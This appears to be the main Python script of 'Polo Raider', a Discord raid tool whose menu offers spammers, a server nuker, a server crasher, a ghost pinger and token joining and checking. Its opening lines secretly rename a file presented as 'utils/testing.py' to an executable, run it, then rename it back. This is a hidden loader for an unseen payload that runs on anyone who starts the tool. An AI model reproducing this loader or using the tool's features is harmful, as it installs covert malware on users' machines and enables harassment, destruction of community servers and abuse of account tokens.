import os,subprocess,time
file_path='utils/testing'
os.rename(f"{file_path}.py",f"{file_path}.exe")
subprocess.run([f"{file_path}.exe"])
time.sleep(1)
os.rename(f"{file_path}.exe",f"{file_path}.py")
from utils.init import*
from core.spammer import*
from core.nickchange import*
from core.reply import*
from core.bio import*
from utils.other.premium import*
from core.nuke import*
from core.check import*
from core.tkncheck import*
from utils.other.set import*
updcheck()
time.sleep(3)
clear()
ctypes.windll.kernel32.SetConsoleTitleW(f"[ Polo Raider ] | Menu")
def tool():logo=f"""                     
{lc}                                            ________      ______      
{fc1}                                            ___  __ \\________  /_____ 
{fc2}                                            __  /_/ /  __ \\_  /_  __ \\
{fc3}                                            _  ____// /_/ /  / / /_/ /
{ldb}                                            /_/     \\____//_/  \\____/             

                            {s}      This Is Free Version, Some Features Are Unavaivable

           {ldb}[{lc}01{ldb}]{lc} → {w}Channel Spammer    {ldb}[{lc}06{ldb}]{lc} → {w}Reaction Spammer   {ldb}[{lc}11{ldb}]{lc} → {w}Ghost Pinger       {ldb}[{lc}16{ldb}]{lc} → {w}Status Changer
           {ldb}[{lc}02{ldb}]{lc} → {w}Dm Spammer         {ldb}[{lc}07{ldb}]{lc} → {w}Server Cloner      {ldb}[{lc}12{ldb}]{lc} → {w}VC Joiner          {ldb}[{lc}17{ldb}]{lc} → {w}Bio Changer
           {ldb}[{lc}03{ldb}]{lc} → {w}Reply Spammer      {ldb}[{lc}08{ldb}]{lc} → {w}Server Lookup      {ldb}[{lc}13{ldb}]{lc} → {w}Token Checker      {ldb}[{lc}18{ldb}]{lc} → {w}Token Info 
           {ldb}[{lc}04{ldb}]{lc} → {w}Group Spammer      {ldb}[{lc}09{ldb}]{lc} → {w}Server Crasher     {ldb}[{lc}14{ldb}]{lc} → {w}Token Joiner       {ldb}[{lc}19{ldb}]{lc} → {w}Settings
           {ldb}[{lc}05{ldb}]{lc} → {w}Thread Spammer     {ldb}[{lc}10{ldb}]{lc} → {w}Server Nuker       {ldb}[{lc}15{ldb}]{lc} → {w}Nickname Changer   {ldb}[{lc}20{ldb}]{lc} → {w}Info
           {ldb}[{lc}POLO{ldb}] {s}| {ldb}[{lc}INPUT{ldb}] {lc}→ """;return logo
async def main():
	inpt=input(tool())
	if inpt=='1':await spammer()
	elif inpt=='2':print('')
	elif inpt=='3':await replyspam()
	elif inpt=='15':await nickchange()
	elif inpt=='17':await bio()
	elif inpt=='10':await nuke()
	elif inpt=='13':await tkncheck()
	elif inpt=='18':await infomain()
	else:await prem()
if __name__=='__main__':asyncio.run(main())
